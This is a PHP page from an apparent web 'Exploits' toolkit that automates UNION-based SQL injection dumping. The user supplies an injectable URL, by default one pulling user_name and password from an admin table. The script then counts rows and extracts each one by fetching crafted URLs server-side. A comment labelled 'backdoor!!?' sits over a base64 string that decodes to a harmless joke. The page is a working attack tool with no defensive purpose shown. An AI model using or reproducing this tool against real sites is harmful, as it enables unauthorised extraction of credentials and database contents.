<?php include("../../header.php"); ?>
<div class="main-panel">
  <div class="content-wrapper">
    <div class="page-header">
      <h3 class="page-title"> Neutralised SQL Dumper </h3>
      <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
          <li class="breadcrumb-item"><a href="#">Exploits</a></li>
          <li class="breadcrumb-item active" aria-current="page">Neutralised SQL Dumper</li>
        </ol>
      </nav>
    </div>
    <div class="content">
      <div class="col-md-12 grid-margin stretch-card">
      <div class="card">
      <div class="card-body">

  <h2 class="text-center">Neutralised SQL Dumper</h2>
  <div class="tile">
    <div class="col-md-12 text-center">
      <form action="" method="post">
      Site:<br /><input name="site" class="form-control" type="text" value="http://www.site.com/x.php?id=-99+UNION+ALL+SELECT+1,Neutralise,3+from+admin--" size="180"/><br />
      Dump:<br /><input name="data" class="form-control" type="text" value="user_name,0x3a,password" size="180"/><br /><br />
      <input name="submit_lol" class="btn btn-outline-primary" value="Submit" type="submit">
      </form>
      <font size='1px'><b>Usage:</b> Enter in the site you have injected, with 'Neutralise' in the visible col.<br />
      Then enter into the dump the cols you wish to extract, adding the 0x3a between each for readability.<br />
      Just like in the above example.</font>
      <?php
      set_time_limit(0);
      if (isset($_POST["submit_lol"])) {
      	$site = htmlentities($_POST['site']);
      	$userdata = htmlentities($_POST['data']);
      	$inj = "unhex(hex(concat(0x4E65757472616C6973653a," . $userdata . ",0x4E65757472616C6973653a)))";
      	$count = "concat(0x4E65757472616C697365,count(*),0x4E65757472616C697365)";
      	echo "<br /><br />[+] Dumping URL : " . $site . "";
      	$old = array(
      		'unhex(hex(concat(0x4E65757472616C6973653a,',
      		'0x3a,',
      		',0x4E65757472616C6973653a)))');
      	$new = array(
      		"",
      		"",
      		"");
      	$dumpn = str_replace($old,$new,$inj);
      	$pieces = explode(",",$dumpn);
      	echo "<br />[+] Extracting : ";
      	foreach ($pieces as $piece) {
      		echo "" . $piece . ",";
      	}
      	$totalcount = str_replace("Neutralise",$count,$site);
      	$limit = get($totalcount);
      	if (!$limit) {
      		echo "<br />[+] Dead injection point!";
      	}
      	else {
      		echo "<br />[+] Found " . $limit . " entries to extract.<br /><br />";
      	}
      	$i = 0;
      	while ($i < $limit) {
      		$i2 = $i + 1;
      		$old = array("Neutralise","--");
      		$new = array($inj,"+limit+" . $i . ",1--");
      		$siteinj = str_replace($old,$new,$site);
      		$siteinjresult = get($siteinj);
      		if (!$siteinjresult) {
      			echo "<br />[+] Wrong cols!";
      		}
      		else {
      			echo "" . $i2 . " " . $siteinjresult . ":<br />";
      		}
      		$i++;
      	}
      }
      function get($site) {
      	$GET = @file_get_contents($site);
      	if (preg_match("/Neutralise(.*?)Neutralise/i",$GET,$matches)) {
      		return $matches[1];
      	}
      }
      //backdoor!!?
      $str = "PCEtLUxPTCBqdXN0IG1lc3Npbmcgd2l0aCB5YSEgWEQtLT4=";
      echo base64_decode($str);
      ?>



            </div>
          </div>
        </div>
  </div>
      </div>
        </div>
        </div>
        </div>
        </div>
        </div>
<?php include("../../footer.php"); ?>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
    <!-- plugins:js -->
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="../../assets/js/off-canvas.js"></script>
    <script src="../../assets/js/hoverable-collapse.js"></script>
    <script src="../../assets/js/misc.js"></script>
    <script src="../../assets/js/settings.js"></script>
    <script src="../../assets/js/todolist.js"></script>
    <!-- endinject -->
  </body>
</html>
